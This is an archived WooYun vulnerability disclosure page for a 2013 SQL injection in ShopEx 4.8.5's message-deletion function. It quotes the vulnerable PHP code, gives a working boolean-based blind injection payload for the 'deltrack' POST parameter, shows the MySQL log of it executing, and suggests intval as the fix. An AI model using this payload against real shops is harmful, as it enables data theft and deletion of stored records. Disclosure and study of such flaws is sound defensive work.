@@ -1,0 +1,229 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		shopex注入漏洞#2  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		shopex注入漏洞#2  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Code_Sec">Code_Sec</a> 
+</li><li>提交时间：		2013-05-26 20:43</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-29：	细节向第三方安全合作伙伴开放<br/>
+									2013-06-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-15：	细节向普通白帽子公开<br/>
+									2013-07-05：	细节向实习白帽子公开<br/>
+									2013-08-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">又是sql注入漏洞<br />
+测试版本：shopex-singel-4.8.5.78660</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">文件：\core\shop\controller\ctl.member.php<br />
+<br />
+</p><pre><code>function delTrackMsg() {<br />
+        if(!empty($_POST[&#039;deltrack&#039;])){<br />
+            $oMsg = &amp;$this-&gt;system-&gt;loadModel(&#039;resources/msgbox&#039;);<br />
+            $oMsg-&gt;delTrackMsg($_POST[&#039;deltrack&#039;]);<br />
+            $this-&gt;splash(&#039;success&#039;, $this-&gt;system-&gt;mkUrl(&quot;member&quot;,&quot;track&quot;), __(&#039;删除成功&#039;));<br />
+        }else{<br />
+            $this-&gt;splash(&#039;failed&#039;, $this-&gt;system-&gt;mkUrl(&quot;member&quot;,&quot;track&quot;), __(&#039;删除失败: 没有选中任何记录！&#039;));<br />
+        }<br />
+    }</code></pre><p class='detail'><br />
+<br />
+跟进$oMsg-&gt;delTrackMsg($_POST[&#039;deltrack&#039;]);<br />
+<br />
+在文件：\core\model_v5\resources\mdl.msgbox.php<br />
+<br />
+</p><pre><code>public function delTrackMsg( $aMsgId )<br />
+{<br />
+       foreach ( $aMsgId as $val )<br />
+       {<br />
+				if ( $val )<br />
+				{<br />
+					$aTmp[] = $val;<br />
+				}<br />
+		}<br />
+		if ( $aTmp )<br />
+			{<br />
+				$this-&gt;db-&gt;exec( &quot;DELETE FROM sdb_message WHERE msg_id IN (&quot;.implode( &quot;,&quot;, $aTmp ).&quot;) AND del_status=&#039;1&#039;&quot; );<br />
+				$this-&gt;db-&gt;exec( &quot;UPDATE sdb_message SET del_status=&#039;2&#039; WHERE msg_id IN (&quot;.implode( &quot;,&quot;, $aTmp ).&quot;)&quot; );<br />
+			}<br />
+			return true;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+出现在DELETE语句的sql注入纯粹是体力活，通过是否删除了message作为判断依据慢慢查吧<br />
+<br />
+提交数据包;deltrack[1]=1) and (select count(*) from sdb_operators)=1%23<br />
+<br />
+查看sql执行记录：<br />
+<br />
+</p><pre><code>130526 20:31:25	  360 Connect	root@localhost on <br />
+		  360 Init DB	shopex<br />
+		  360 Query	SET NAMES &#039;utf8&#039;<br />
+		  360 Query	SELECT * FROM sdb_plugins WHERE plugin_type=&quot;app&quot;<br />
+		  360 Query	select * from sdb_plugins where plugin_type=&quot;app&quot; and plugin_ident=&#039;commodity_radar&#039; LIMIT 0, 1<br />
+		  360 Query	select * from sdb_plugins where plugin_type=&quot;app&quot; and plugin_ident=&#039;shopex_stat&#039; LIMIT 0, 1<br />
+		  360 Query	select member_id,member_lv_id,email,uname,b_year,b_month,b_day,password,unreadmsg,cur,lang,point,experience from sdb_members where member_id=4 LIMIT 0, 1<br />
+		  360 Query	SELECT count(*) AS unreadmsg FROM sdb_message WHERE to_type = 0 AND del_status != &#039;1&#039; AND folder = &#039;inbox&#039; AND unread = &#039;0&#039; AND to_id =4 LIMIT 0, 1<br />
+		  360 Query	SELECT plugin_name,plugin_ident FROM sdb_plugins WHERE 1 AND sdb_plugins.disabled = &#039;false&#039; AND sdb_plugins.plugin_type=&#039;app&#039; LIMIT 0, 20<br />
+		  360 Query	SELECT plugin_id,plugin_path,plugin_struct,plugin_config,plugin_base FROM sdb_plugins WHERE plugin_type=&#039;app&#039; AND plugin_ident=&#039;commodity_radar&#039; LIMIT 0, 1<br />
+		  360 Query	SELECT plugin_id,plugin_path,plugin_struct,plugin_config,plugin_base FROM sdb_plugins WHERE plugin_type=&#039;app&#039; AND plugin_ident=&#039;shopex_stat&#039; LIMIT 0, 1<br />
+		  360 Query	SELECT plugin_id,plugin_path,plugin_struct,plugin_config,plugin_base FROM sdb_plugins WHERE plugin_type=&#039;app&#039; AND plugin_ident=&#039;pay_offline&#039; LIMIT 0, 1<br />
+		  360 Query	DELETE FROM sdb_message WHERE msg_id IN (1) and (select count(*) from sdb_operators)=1#) AND del_status=&#039;1&#039;</code></pre><p class='detail'><br />
+<br />
+执行成功<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/262037153076a771047d913678f443c4739ec794.jpg" target="_blank"><img src="../images/262037153076a771047d913678f443c4739ec794.jpg" alt="2013-05-26_203646.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+因为(select count(*) from sdb_operators)=1，所以msg_id=1的记录被删除。<br />
+<br />
+慢慢猜解吧。。。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">intval </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Code_Sec" title="Code_Sec">Code_Sec</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-024555" title="shopex注入漏洞#2">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-05-26 23:18</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="24555";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
